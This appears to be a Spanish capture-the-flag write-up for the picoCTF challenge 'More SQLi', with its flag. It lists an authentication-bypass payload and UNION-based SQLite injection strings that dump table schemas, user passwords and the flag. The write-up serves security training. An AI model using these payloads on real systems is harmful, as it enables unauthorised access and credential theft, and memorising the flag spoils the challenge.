# More SQLi
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

## Solucion

- Inyección en SQLI SQLite
- Primero pasamos el login con inyección en password
```
' or 1=1;
```
- Luego en la búsqueda inyectamos para obtener la info
```
search=Lagos' union select 1,2,sqlite_version() ;&submit=Search
search=Lagos' union select 1,2,tbl_name from sqlite_master ;&submit=Search
search=Lagos' union select 1,2,sql from sqlite_master ;&submit=Search
search=Lagos' union select 1,name,password from users ;&submit=Search
search=Lagos' union select 1,2,flag from more_table ;&submit=Search

```
## Bandera
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}

## Referencias

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md